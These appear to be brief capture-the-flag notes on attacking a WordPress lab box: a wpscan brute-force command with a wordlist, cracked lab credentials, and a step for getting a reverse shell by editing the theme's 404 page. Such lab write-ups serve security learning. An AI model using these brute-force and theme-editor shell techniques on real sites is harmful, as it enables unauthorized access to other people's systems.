scanning it via wpscan

wordpress 5.4.2

![[Pasted image 20210529162626.png]]

and we can bruteforce the creds and admin is a username 

![[Pasted image 20210529162713.png]]

`wpscan --url http://internal.thm/wordpress/  -U admin -P /usr/share/wordlists/rockyou.txt -t 50`

![[Pasted image 20210529163002.png]]

`admin:my2boys`

![[Pasted image 20210529163129.png]]

and in the posts section there is a private post 

![[Pasted image 20210529163248.png]]

and another creds

![[Pasted image 20210529163309.png]]

`william:arnold147`

## rev shell

edit the 404 page

http://internal.thm/blog/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen

listen on port 

`curl http://internal.thm/wordpress/` 

![[Pasted image 20210529163918.png]]